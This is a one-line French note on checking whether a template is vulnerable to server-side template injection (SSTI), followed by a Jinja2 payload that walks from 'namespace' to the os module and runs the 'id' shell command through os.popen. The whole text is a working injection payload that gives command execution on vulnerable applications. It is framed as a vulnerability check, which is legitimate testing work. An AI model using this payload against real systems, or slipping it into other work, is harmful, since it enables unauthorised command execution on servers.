pour verifier si une template est vulnerable a un SSTI

```
{{ namespace.__init__.__globals__.os.popen('id').read() }}
```